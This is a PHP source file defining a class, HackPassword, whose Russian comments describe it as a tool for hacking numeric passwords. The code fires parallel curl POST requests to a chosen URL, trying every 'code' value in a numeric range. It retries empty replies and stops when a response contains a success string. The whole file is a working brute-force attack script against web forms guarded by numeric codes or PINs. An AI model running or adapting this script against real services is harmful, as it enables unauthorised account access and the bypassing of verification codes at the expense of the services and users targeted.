<?php

namespace hack\HackPassword;

/*
 * Класс для хака паролей(Для цифровых паролей)
 * */
class HackPassword {

    //ссылка на запрос POST
    private $url;
    //цифра начала цикла отправки
    private $start;
    //Шаг цифр отправки
    private $step;
    //Результат ответа
    private $message;

    /*
     * @param $url - ссылка отправки запроса
     * @return HackPassword
     * */
    public function setUrl($url) {
        $this->url = $url;

        return $this;
    }

    /*
     * @param $start - цифра начала итерации
     * @return HackPassword
     * */
    public function setStart($start) {
        $this->start = $start;

        return $this;
    }

    /*
     * @param $start - Шаг цифр
     * @return HackPassword
     * */
    public function setStep($step) {
        $this->step = $step;

        return $this;
    }

    /*
     * Метод начинает хакать
     * @return bool
     * */
    public function startHack() {
        //Создаем массив цифр от start до start+step
        $arr_p = range($this->start,$this->start+$this->step);

        do {
            $ch = [];

            $mh = curl_multi_init();

            //Заполняем CURL Цифрами
            $this->setEach($arr_p,$mh,$ch);

            $this->startDescriptors($mh);

            $arr_p = [];

            if($this->readData($ch,$mh,$arr_p)) {
                return true;
            }

            curl_multi_close($mh);
        } while(count($arr_p));

        return false;
    }

    /*
     * Заполняем цикл curl
     * @param $ch - массив CURL запросов
     * @param $mh - мультипоточный CURL
     * @param $data - массив цифр
     * @return null
     * */
    private function setEach($data,&$mh,&$ch) {
        foreach($data as $item) {
            $ch[$item] = curl_init();
            curl_setopt($ch[$item], CURLOPT_URL, $this->url);
            curl_setopt($ch[$item], CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch[$item], CURLOPT_POST, true);
            curl_setopt($ch[$item], CURLOPT_POSTFIELDS, 'code='.$item);

            curl_multi_add_handle($mh,$ch[$item]);
        }
    }

    /*
     * Читаем ответы полученные от CURL Запроса
     * @param $ch - массив CURL запросов
     * @param $mh - мультипоточный CURL
     * @param $arr_p - указатель, заполняемый массив пустыми ответами
     * @return bool
     * */
    private function readData($ch,$mh,&$arr_p) {
        //Ответы потоков
        $returned = [];

        foreach ($ch as $identifier => $request) {
            $returned[$identifier] = curl_multi_getcontent($request);


            if (mb_strpos($returned[$identifier],'wikipedia') !== false) {
                $this->setMessage($returned[$identifier]);
                return true;
            }

            if($returned[$identifier] == '') {
                $arr_p[$identifier] = $identifier;
            }

            curl_multi_remove_handle($mh, $request);
            curl_close($request);
        }

        return false;
    }

    /*
     * Запуск дескрипторов
     * @param $mh - мультипоточный CURL
     * @return bool
     * */
    private function startDescriptors(&$mh) {
        $active = null;
        //запускаем дескрипторы
        do {
            $mrc = curl_multi_exec($mh, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM || $active);

        while ($active && $mrc == CURLM_OK) {

            if (curl_multi_select($mh) != -1) {
                do {
                    $mrc = curl_multi_exec($mh, $active);
                } while ($mrc == CURLM_CALL_MULTI_PERFORM);
            }
        }

        return true;
    }

    /*
     * Set приватное свойство $message
     * @param $message - сообщение
     * */
    public function setMessage($message) {
        $this->message = $message;
    }

    /*
     * Get приватное свойство $message
     * */
    public function getMessage() {
        return $this->message;
    }
}